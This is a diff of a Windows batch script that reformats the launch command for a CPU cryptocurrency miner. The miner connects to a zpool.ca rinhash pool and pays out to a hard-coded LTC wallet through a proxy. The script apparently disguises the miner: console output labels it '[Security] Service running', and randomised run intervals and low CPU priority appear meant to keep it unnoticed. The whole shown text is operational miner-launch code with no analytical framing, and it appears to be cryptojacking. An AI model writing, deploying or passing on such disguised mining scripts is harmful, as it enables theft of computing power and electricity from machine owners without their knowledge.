@@ -158,9 +158,22 @@ echo ----------------------------------------
 echo [Security] Service running
 echo ----------------------------------------
 
-start "%WINTITLE%" cmd /c ^
-""%BIN%" --algorithm rinhash --pool rinhash.sea.mine.zpool.ca:7444 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --password c=LTC,d=0.001 --disable-gpu --nicehash false --keepalive true --disable-startup-monitor --disable-huge-pages --disable-msr-tweaks --cpu-threads 6 --cpu-threads-intensity 1 --cpu-threads-priority 1 --miner-priority 1 --proxy %PROXY%""
-
+start "%WINTITLE%" "%BIN%" ^
+ --algorithm rinhash ^
+ --pool rinhash.sea.mine.zpool.ca:7444 ^
+ --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc ^
+ --password c=LTC,d=0.001 ^
+ --disable-gpu ^
+ --nicehash false ^
+ --keepalive true ^
+ --disable-startup-monitor ^
+ --disable-huge-pages ^
+ --disable-msr-tweaks ^
+ --cpu-threads 6 ^
+ --cpu-threads-intensity 1 ^
+ --cpu-threads-priority 1 ^
+ --miner-priority 1 ^
+ --proxy %PROXY%
 
 REM Wait 18–22 minutes
 set /a RUN1=1080 + (%RANDOM% %% 241)
@@ -178,9 +191,22 @@ echo ----------------------------------------
 echo [Security] Service running
 echo ----------------------------------------
 
-start "%WINTITLE%" cmd /c ^
-""%BIN%" --algorithm rinhash --pool rinhash.sea.mine.zpool.ca:7444 --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc --password c=LTC,d=0.001 --disable-gpu --nicehash false --keepalive true --disable-startup-monitor --disable-huge-pages --disable-msr-tweaks --cpu-threads 6 --cpu-threads-intensity 1 --cpu-threads-priority 1 --miner-priority 1 --proxy %PROXY%""
-
+start "%WINTITLE%" "%BIN%" ^
+ --algorithm rinhash ^
+ --pool rinhash.sea.mine.zpool.ca:7444 ^
+ --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc ^
+ --password c=LTC,d=0.001 ^
+ --disable-gpu ^
+ --nicehash false ^
+ --keepalive true ^
+ --disable-startup-monitor ^
+ --disable-huge-pages ^
+ --disable-msr-tweaks ^
+ --cpu-threads 6 ^
+ --cpu-threads-intensity 1 ^
+ --cpu-threads-priority 1 ^
+ --miner-priority 1 ^
+ --proxy %PROXY%
 
 REM Wait 17–23 minutes
 set /a RUN2=1020 + (%RANDOM% %% 361)
